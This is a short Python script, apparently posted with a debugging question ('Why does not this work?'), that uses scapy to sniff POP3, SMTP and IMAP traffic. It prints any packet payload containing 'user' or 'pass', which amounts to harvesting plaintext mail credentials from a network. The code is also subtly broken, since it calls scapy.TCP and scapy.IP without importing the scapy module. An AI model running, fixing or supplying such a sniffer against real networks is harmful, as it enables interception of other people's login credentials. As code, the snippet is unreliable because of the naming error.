from scapy.all import sniff, IP, TCP

# callback for recieving packets
def packet_callback(packet):
    if packet[TCP].payload:
        mypacket = str(packet[scapy.TCP].payload)
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
            print(f'[*] Destination: {packet[scapy.IP].dst}')
            print(f'[*] {str(packet[scapy.TCP].payload)}')

def main():
    # launch sniffer
    sniff(
        filter='tcp port 110 or tcp port 25 or tcp port 143',
        prn=packet_callback,
        store=0
    )

if __name__ == '__main__':
    main()

# Why does not this work?